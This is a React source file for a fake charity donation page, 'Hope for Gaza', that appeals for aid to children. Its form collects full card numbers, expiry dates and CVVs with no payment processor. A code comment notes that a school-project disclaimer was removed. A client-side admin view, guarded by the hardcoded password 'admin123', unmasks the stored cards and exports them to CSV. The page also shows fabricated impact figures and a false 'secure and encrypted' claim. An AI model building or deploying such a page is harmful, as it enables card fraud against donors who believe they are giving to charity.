'use client';

import { useState, useEffect } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Heart, Shield, Users, Eye, EyeOff, Download, HandHeart, Sparkles, Star } from 'lucide-react';

interface Donation {
  id: string;
  name: string;
  email: string;
  amount: string;
  cardNumber: string;
  expiryDate: string;
  cvv: string;
  country: string;
  createdAt: string;
}

export default function DonationPage() {
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    amount: '',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    country: ''
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitMessage, setSubmitMessage] = useState('');
  const [showAdmin, setShowAdmin] = useState(false);
  const [adminPassword, setAdminPassword] = useState('');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [donations, setDonations] = useState<Donation[]>([]);
  const [showCardNumbers, setShowCardNumbers] = useState(false);

  const fetchDonations = async () => {
    try {
      console.log('🔄 Fetching donations...');
      const response = await fetch('/api/admin/donations');
      console.log('📡 Response status:', response.status);
      
      if (response.ok) {
        const data = await response.json();
        console.log('📊 Donations data:', data);
        setDonations(data);
      } else {
        console.error('❌ Failed to fetch donations:', response.statusText);
      }
    } catch (error) {
      console.error('❌ Error fetching donations:', error);
    }
  };

  useEffect(() => {
    if (isAuthenticated) {
      fetchDonations();
    }
  }, [isAuthenticated]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleSelectChange = (value: string) => {
    setFormData(prev => ({
      ...prev,
      country: value
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setSubmitMessage('');

    console.log('📤 Submitting donation:', formData);

    try {
      const response = await fetch('/api/donate', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });

      console.log('📡 Donation response status:', response.status);

      if (response.ok) {
        const result = await response.json();
        console.log('✅ Donation successful:', result);
        setSubmitMessage('Thank you for your generous donation! Your contribution will help provide essential supplies to children in Gaza.');
        setFormData({
          name: '',
          email: '',
          amount: '',
          cardNumber: '',
          expiryDate: '',
          cvv: '',
          country: ''
        });
        if (isAuthenticated) {
          fetchDonations();
        }
      } else {
        const error = await response.json();
        console.error('❌ Donation failed:', error);
        setSubmitMessage('There was an error processing your donation. Please try again.');
      }
    } catch (error) {
      console.error('❌ Donation error:', error);
      setSubmitMessage('There was an error processing your donation. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleAdminLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (adminPassword === 'admin123') {
      setIsAuthenticated(true);
      setAdminPassword('');
    } else {
      alert('Invalid password');
    }
  };

  const maskCardNumber = (cardNumber: string) => {
    if (showCardNumbers) return cardNumber;
    return '****-****-****-' + cardNumber.slice(-4);
  };

  const maskCvv = (cvv: string) => {
    if (showCardNumbers) return cvv;
    return '***';
  };

  const exportToCSV = () => {
    const headers = ['Name', 'Email', 'Amount', 'Card Number', 'Expiry', 'CVV', 'Country', 'Date'];
    const csvContent = [
      headers.join(','),
      ...donations.map(d => [
        d.name,
        d.email,
        d.amount,
        d.cardNumber,
        d.expiryDate,
        d.cvv,
        d.country,
        new Date(d.createdAt).toLocaleString()
      ].join(','))
    ].join('\n');

    const blob = new Blob([csvContent], { type: 'text/csv' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'donations.csv';
    a.click();
  };

  if (showAdmin && !isAuthenticated) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-purple-50 to-pink-50 flex items-center justify-center">
        <Card className="w-96 shadow-xl border-0 bg-white/80 backdrop-blur">
          <CardHeader className="text-center">
            <CardTitle className="text-2xl bg-gradient-to-r from-purple-600 to-pink-600 bg-clip-text text-transparent">Admin Login</CardTitle>
            <CardDescription>Enter admin password to access donation data</CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleAdminLogin} className="space-y-4">
              <div>
                <Label htmlFor="password">Admin Password</Label>
                <Input
                  id="password"
                  type="password"
                  value={adminPassword}
                  onChange={(e) => setAdminPassword(e.target.value)}
                  placeholder="Enter password"
                  className="border-purple-200 focus:border-purple-400"
                />
              </div>
              <Button type="submit" className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700">Login</Button>
              <Button 
                type="button" 
                variant="outline" 
                className="w-full border-purple-200 hover:bg-purple-50"
                onClick={() => setShowAdmin(false)}
              >
                Back to Donation Page
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
    );
  }

  if (showAdmin && isAuthenticated) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-purple-50 to-pink-50">
        <header className="bg-white shadow-lg border-b border-purple-100">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4">
            <div className="flex items-center justify-between">
              <h1 className="text-2xl font-bold bg-gradient-to-r from-purple-600 to-pink-600 bg-clip-text text-transparent">Admin Dashboard</h1>
              <div className="flex items-center space-x-4">
                <Button
                  variant="outline"
                  onClick={() => setShowCardNumbers(!showCardNumbers)}
                  className="border-purple-200 hover:bg-purple-50"
                >
                  {showCardNumbers ? <EyeOff className="h-4 w-4 mr-2" /> : <Eye className="h-4 w-4 mr-2" />}
                  {showCardNumbers ? 'Hide' : 'Show'} Sensitive Data
                </Button>
                <Button variant="outline" onClick={exportToCSV} className="border-purple-200 hover:bg-purple-50">
                  <Download className="h-4 w-4 mr-2" />
                  Export CSV
                </Button>
                <Button 
                  variant="outline"
                  onClick={() => {
                    setIsAuthenticated(false);
                    setShowAdmin(false);
                  }}
                  className="border-purple-200 hover:bg-purple-50"
                >
                  Logout
                </Button>
              </div>
            </div>
          </div>
        </header>

        <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
          <div className="mb-6">
            <h2 className="text-3xl font-bold bg-gradient-to-r from-purple-600 to-pink-600 bg-clip-text text-transparent">Donation Records</h2>
            <p className="text-gray-600">Total donations: {donations.length}</p>
            <div className="mt-4 flex items-center space-x-4">
              <Button 
                variant="outline" 
                size="sm"
                onClick={fetchDonations}
                className="border-purple-200 hover:bg-purple-50"
              >
                Refresh Data
              </Button>
              <span className="text-sm text-gray-500">
                Last updated: {new Date().toLocaleTimeString()}
              </span>
            </div>
          </div>

          <div className="bg-white shadow-xl rounded-lg overflow-hidden border border-purple-100">
            <div className="overflow-x-auto">
              <table className="min-w-full divide-y divide-purple-100">
                <thead className="bg-gradient-to-r from-purple-50 to-pink-50">
                  <tr>
                    <th className="px-6 py-3 text-left text-xs font-medium text-purple-700 uppercase tracking-wider">Name</th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-purple-700 uppercase tracking-wider">Email</th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-purple-700 uppercase tracking-wider">Amount</th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-purple-700 uppercase tracking-wider">Card Number</th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-purple-700 uppercase tracking-wider">Expiry</th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-purple-700 uppercase tracking-wider">CVV</th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-purple-700 uppercase tracking-wider">Country</th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-purple-700 uppercase tracking-wider">Date</th>
                  </tr>
                </thead>
                <tbody className="bg-white divide-y divide-purple-50">
                  {donations.map((donation) => (
                    <tr key={donation.id} className="hover:bg-purple-50">
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">{donation.name}</td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{donation.email}</td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-semibold text-green-600">${donation.amount}</td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{maskCardNumber(donation.cardNumber)}</td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{donation.expiryDate}</td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{maskCvv(donation.cvv)}</td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{donation.country}</td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                        {new Date(donation.createdAt).toLocaleString()}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
              {donations.length === 0 && (
                <div className="text-center py-8 text-gray-500">
                  No donations received yet
                </div>
              )}
            </div>
          </div>
        </main>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-orange-100 via-pink-50 to-purple-100">
      {/* Header */}
      <header className="bg-white/90 backdrop-blur-md shadow-lg border-b border-orange-100">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-3">
              <div className="relative">
                <Heart className="h-10 w-10 text-red-500 animate-pulse" />
                <Sparkles className="h-4 w-4 text-yellow-400 absolute -top-1 -right-1" />
              </div>
              <h1 className="text-3xl font-bold bg-gradient-to-r from-orange-500 to-pink-500 bg-clip-text text-transparent">Hope for Gaza</h1>
            </div>
            <div className="flex items-center space-x-4">
              <Button
                variant="outline"
                size="sm"
                onClick={() => setShowAdmin(true)}
                className="border-orange-200 hover:bg-orange-50"
              >
                Admin
              </Button>
              <div className="flex items-center space-x-2 text-sm text-gray-600">
                <Shield className="h-4 w-4 text-green-500" />
                <span>Secure Donation</span>
              </div>
            </div>
          </div>
        </div>
      </header>

      {/* Hero Section with Images */}
      <section className="relative py-16 px-4 sm:px-6 lg:px-8">
        <div className="max-w-7xl mx-auto">
          {/* Hero Image Gallery */}
          <div className="grid md:grid-cols-2 gap-8 mb-12">
            <div className="relative rounded-2xl overflow-hidden shadow-2xl">
              <img 
                src="/child1.jpg" 
                alt="Child in need" 
                className="w-full h-96 object-cover"
              />
              <div className="absolute inset-0 bg-gradient-to-t from-black/50 to-transparent flex items-end">
                <div className="p-6 text-white">
                  <h3 className="text-2xl font-bold mb-2">Every Child Deserves Hope</h3>
                  <p className="text-lg">Your donation brings light to their darkness</p>
                </div>
              </div>
            </div>
            <div className="relative rounded-2xl overflow-hidden shadow-2xl">
              <img 
                src="/children2.jpg" 
                alt="Children receiving aid" 
                className="w-full h-96 object-cover"
              />
              <div className="absolute inset-0 bg-gradient-to-t from-black/50 to-transparent flex items-end">
                <div className="p-6 text-white">
                  <h3 className="text-2xl font-bold mb-2">Together We Can Make a Difference</h3>
                  <p className="text-lg">Providing essential supplies to those in need</p>
                </div>
              </div>
            </div>
          </div>

          <div className="text-center mb-12">
            <h2 className="text-5xl md:text-6xl font-bold bg-gradient-to-r from-orange-500 via-pink-500 to-purple-500 bg-clip-text text-transparent mb-6">
              Help Feed the Children of Gaza
            </h2>
            <p className="text-xl text-gray-700 max-w-4xl mx-auto leading-relaxed">
              Every day, thousands of children in Gaza face hunger and malnutrition. 
              Your donation can provide essential food, clean water, medical supplies, and education 
              to those who need it most. Together, we can bring hope back to their lives.
            </p>
          </div>

          {/* Impact Stats with Enhanced Design */}
          <div className="grid md:grid-cols-3 gap-8 mb-16">
            <Card className="text-center border-0 shadow-xl bg-gradient-to-br from-blue-50 to-cyan-50 hover:shadow-2xl transition-shadow">
              <CardContent className="pt-8">
                <div className="relative">
                  <Users className="h-16 w-16 text-blue-500 mx-auto mb-4" />
                  <Star className="h-6 w-6 text-yellow-400 absolute -top-2 -right-2" />
                </div>
                <h3 className="text-4xl font-bold text-blue-600 mb-2">50,000+</h3>
                <p className="text-gray-700 font-medium">Children Helped</p>
              </CardContent>
            </Card>
            <Card className="text-center border-0 shadow-xl bg-gradient-to-br from-red-50 to-pink-50 hover:shadow-2xl transition-shadow">
              <CardContent className="pt-8">
                <div className="relative">
                  <Heart className="h-16 w-16 text-red-500 mx-auto mb-4" />
                  <Sparkles className="h-6 w-6 text-yellow-400 absolute -top-2 -right-2" />
                </div>
                <h3 className="text-4xl font-bold text-red-600 mb-2">$2.5M</h3>
                <p className="text-gray-700 font-medium">Raised So Far</p>
              </CardContent>
            </Card>
            <Card className="text-center border-0 shadow-xl bg-gradient-to-br from-green-50 to-emerald-50 hover:shadow-2xl transition-shadow">
              <CardContent className="pt-8">
                <div className="relative">
                  <Shield className="h-16 w-16 text-green-500 mx-auto mb-4" />
                  <Star className="h-6 w-6 text-yellow-400 absolute -top-2 -right-2" />
                </div>
                <h3 className="text-4xl font-bold text-green-600 mb-2">100%</h3>
                <p className="text-gray-700 font-medium">Goes to Aid</p>
              </CardContent>
            </Card>
          </div>

          {/* Additional Impact Images */}
          <div className="grid md:grid-cols-2 gap-8 mb-16">
            <div className="relative rounded-2xl overflow-hidden shadow-2xl">
              <img 
                src="/education.jpg" 
                alt="Education for children" 
                className="w-full h-64 object-cover"
              />
              <div className="absolute inset-0 bg-gradient-to-t from-purple-600/70 to-transparent flex items-end">
                <div className="p-6 text-white">
                  <h3 className="text-xl font-bold mb-2">Education & Hope</h3>
                  <p>Providing learning opportunities for a brighter future</p>
                </div>
              </div>
            </div>
            <div className="relative rounded-2xl overflow-hidden shadow-2xl">
              <img 
                src="/medical.jpg" 
                alt="Medical aid for children" 
                className="w-full h-64 object-cover"
              />
              <div className="absolute inset-0 bg-gradient-to-t from-green-600/70 to-transparent flex items-end">
                <div className="p-6 text-white">
                  <h3 className="text-xl font-bold mb-2">Medical Care</h3>
                  <p>Essential healthcare supplies for vulnerable children</p>
                </div>
              </div>
            </div>
          </div>

          {/* Donation Form with Enhanced Design */}
          <div className="max-w-2xl mx-auto">
            <Card className="border-0 shadow-2xl bg-gradient-to-br from-white to-orange-50">
              <CardHeader className="text-center pb-8">
                <div className="flex justify-center mb-4">
                  <HandHeart className="h-12 w-12 text-orange-500" />
                </div>
                <CardTitle className="text-3xl bg-gradient-to-r from-orange-500 to-pink-500 bg-clip-text text-transparent">Make Your Donation</CardTitle>
                <CardDescription className="text-lg text-gray-600">
                  Your secure donation will make a real difference in a child's life
                </CardDescription>
              </CardHeader>
              <CardContent className="px-8">
                <form onSubmit={handleSubmit} className="space-y-6">
                  {/* Personal Information */}
                  <div className="space-y-4">
                    <h3 className="text-lg font-semibold text-gray-800 flex items-center">
                      <Users className="h-5 w-5 mr-2 text-orange-500" />
                      Personal Information
                    </h3>
                    <div className="grid md:grid-cols-2 gap-4">
                      <div>
                        <Label htmlFor="name" className="text-gray-700">Full Name</Label>
                        <Input
                          id="name"
                          name="name"
                          type="text"
                          required
                          value={formData.name}
                          onChange={handleInputChange}
                          placeholder="John Doe"
                          className="border-orange-200 focus:border-orange-400 focus:ring-orange-200"
                        />
                      </div>
                      <div>
                        <Label htmlFor="email" className="text-gray-700">Email Address</Label>
                        <Input
                          id="email"
                          name="email"
                          type="email"
                          required
                          value={formData.email}
                          onChange={handleInputChange}
                          placeholder="john@example.com"
                          className="border-orange-200 focus:border-orange-400 focus:ring-orange-200"
                        />
                      </div>
                    </div>
                    <div>
                      <Label htmlFor="country" className="text-gray-700">Country</Label>
                      <Select onValueChange={handleSelectChange} value={formData.country}>
                        <SelectTrigger className="border-orange-200 focus:border-orange-400 focus:ring-orange-200">
                          <SelectValue placeholder="Select your country" />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="us">United States</SelectItem>
                          <SelectItem value="uk">United Kingdom</SelectItem>
                          <SelectItem value="ca">Canada</SelectItem>
                          <SelectItem value="au">Australia</SelectItem>
                          <SelectItem value="de">Germany</SelectItem>
                          <SelectItem value="fr">France</SelectItem>
                          <SelectItem value="sa">Saudi Arabia</SelectItem>
                          <SelectItem value="ae">United Arab Emirates</SelectItem>
                          <SelectItem value="other">Other</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                  </div>

                  {/* Donation Amount */}
                  <div>
                    <h3 className="text-lg font-semibold text-gray-800 mb-4 flex items-center">
                      <Heart className="h-5 w-5 mr-2 text-red-500" />
                      Donation Amount (USD)
                    </h3>
                    <div className="grid grid-cols-2 md:grid-cols-4 gap-3 mb-4">
                      {['25', '50', '100', '250'].map((amount) => (
                        <Button
                          key={amount}
                          type="button"
                          variant={formData.amount === amount ? "default" : "outline"}
                          onClick={() => setFormData(prev => ({ ...prev, amount }))}
                          className={`text-lg font-semibold transition-all ${
                            formData.amount === amount 
                              ? 'bg-gradient-to-r from-orange-500 to-pink-500 hover:from-orange-600 hover:to-pink-600' 
                              : 'border-orange-200 hover:bg-orange-50 hover:border-orange-300'
                          }`}
                        >
                          ${amount}
                        </Button>
                      ))}
                    </div>
                    <div>
                      <Label htmlFor="amount" className="text-gray-700">Custom Amount</Label>
                      <Input
                        id="amount"
                        name="amount"
                        type="number"
                        min="1"
                        required
                        value={formData.amount}
                        onChange={handleInputChange}
                        placeholder="Enter amount"
                        className="border-orange-200 focus:border-orange-400 focus:ring-orange-200"
                      />
                    </div>
                  </div>

                  {/* Credit Card Information */}
                  <div className="space-y-4">
                    <h3 className="text-lg font-semibold text-gray-800 flex items-center">
                      <Shield className="h-5 w-5 mr-2 text-green-500" />
                      Credit Card Information
                    </h3>
                    <div>
                      <Label htmlFor="cardNumber" className="text-gray-700">Card Number</Label>
                      <Input
                        id="cardNumber"
                        name="cardNumber"
                        type="text"
                        required
                        value={formData.cardNumber}
                        onChange={handleInputChange}
                        placeholder="1234 5678 9012 3456"
                        maxLength={19}
                        className="border-orange-200 focus:border-orange-400 focus:ring-orange-200"
                      />
                    </div>
                    <div className="grid grid-cols-2 gap-4">
                      <div>
                        <Label htmlFor="expiryDate" className="text-gray-700">Expiry Date</Label>
                        <Input
                          id="expiryDate"
                          name="expiryDate"
                          type="text"
                          required
                          value={formData.expiryDate}
                          onChange={handleInputChange}
                          placeholder="MM/YY"
                          maxLength={5}
                          className="border-orange-200 focus:border-orange-400 focus:ring-orange-200"
                        />
                      </div>
                      <div>
                        <Label htmlFor="cvv" className="text-gray-700">CVV</Label>
                        <Input
                          id="cvv"
                          name="cvv"
                          type="text"
                          required
                          value={formData.cvv}
                          onChange={handleInputChange}
                          placeholder="123"
                          maxLength={4}
                          className="border-orange-200 focus:border-orange-400 focus:ring-orange-200"
                        />
                      </div>
                    </div>
                  </div>

                  {/* Submit Button */}
                  <Button 
                    type="submit" 
                    className="w-full text-lg py-6 bg-gradient-to-r from-orange-500 to-pink-500 hover:from-orange-600 hover:to-pink-600 font-semibold shadow-lg"
                    disabled={isSubmitting}
                  >
                    {isSubmitting ? 'Processing...' : `Donate $${formData.amount || '0'}`}
                  </Button>

                  {/* Security Note */}
                  <div className="text-center text-sm text-gray-600 flex items-center justify-center">
                    <Shield className="h-4 w-4 mr-2 text-green-500" />
                    Your payment information is secure and encrypted
                  </div>
                </form>

                {/* Success/Error Message */}
                {submitMessage && (
                  <div className={`mt-6 p-4 rounded-lg text-center ${
                    submitMessage.includes('Thank you') 
                      ? 'bg-gradient-to-r from-green-50 to-emerald-50 text-green-800 border border-green-200' 
                      : 'bg-gradient-to-r from-red-50 to-pink-50 text-red-800 border border-red-200'
                  }`}>
                    {submitMessage}
                  </div>
                )}
              </CardContent>
            </Card>
          </div>
        </div>
      </section>

      {/* Footer - Removed school project disclaimer */}
      <footer className="bg-gradient-to-r from-gray-900 to-gray-800 text-white py-12 px-4 sm:px-6 lg:px-8 mt-16">
        <div className="max-w-7xl mx-auto">
          <div className="grid md:grid-cols-3 gap-8">
            <div>
              <div className="flex items-center space-x-2 mb-4">
                <Heart className="h-8 w-8 text-red-500" />
                <h3 className="text-xl font-bold">Hope for Gaza</h3>
              </div>
              <p className="text-gray-300">
                Bringing hope and essential supplies to children in need.
              </p>
            </div>
            <div>
              <h4 className="text-lg font-semibold mb-4">Our Mission</h4>
              <p className="text-gray-300">
                We provide food, water, medical supplies, and education to children 
                affected by the crisis in Gaza.
              </p>
            </div>
            <div>
              <h4 className="text-lg font-semibold mb-4">Contact Us</h4>
              <p className="text-gray-300">
                Together we can make a difference in the lives of thousands of children.
              </p>
            </div>
          </div>
          <div className="border-t border-gray-700 mt-8 pt-8 text-center">
            <p className="text-gray-400">
              © 2024 Hope for Gaza. Every donation counts.
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
}